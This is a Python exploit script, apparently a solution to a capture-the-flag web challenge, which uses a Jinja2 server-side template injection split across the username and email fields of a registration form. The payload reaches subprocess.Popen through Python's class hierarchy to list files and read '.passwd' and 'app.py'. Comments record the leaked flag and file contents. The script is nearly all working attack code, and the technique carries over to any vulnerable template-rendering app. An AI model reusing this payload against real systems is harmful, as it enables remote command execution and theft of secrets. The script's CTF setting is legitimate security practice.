import requests
import random
import base64

url = "https://nopsctf-casino.chals.io"

# username = '{{1.__class__.__mro__[1].__subclasses__()[528](["ls", "-a"], stdout=-1).communicate() if 1 else """'
# .passwd app.py requirements.txt template.csv templates

username = '{{1.__class__.__mro__[1].__subclasses__()[528](["cat", ".passwd"], stdout=-1).communicate() if 1 else """'
# N0PS{s5T1_4veRywh3R3!!}

# explore more...
# username = '{{1.__class__.__mro__[1].__subclasses__()[528](["cat", "template.csv"], stdout=-1).communicate() if 1 else """'
# (leak template.csv)
# USERNAME,{{ username }}
# MAIL,{{ email }}
# INSCRIPTION DATE,{{ created_at }}
# MONEY,{{ money }}
# STATS,{{ stats }}

# username = '{{1.__class__.__mro__[1].__subclasses__()[528](["cat", "app.py"], stdout=-1).communicate() if 1 else """'
# (leak app.py)


email = '"""}}@gmail.com'


def exp(username, email):
    if len(username) > 250:
        print("[!] Username too long, len:", len(username))
        exit(1)

    resp = requests.post(url + "/register", data={
        "username": username,
        "email": email,
        "password": "1337"
    })
    print("[*]/register:", resp.status_code)
    if "A user with this username already exists" in resp.text:
        print("[!] Something went wrong...")
        exit(1)

    with requests.session() as s:
        resp = s.post(url + "/login", data={
            "username": username,
            "password": "1337"
        })
        print("[*]/login:", resp.status_code)

        resp = s.get(url + "/export")
        print("[*]/export:", resp.text)


exp(username, email)
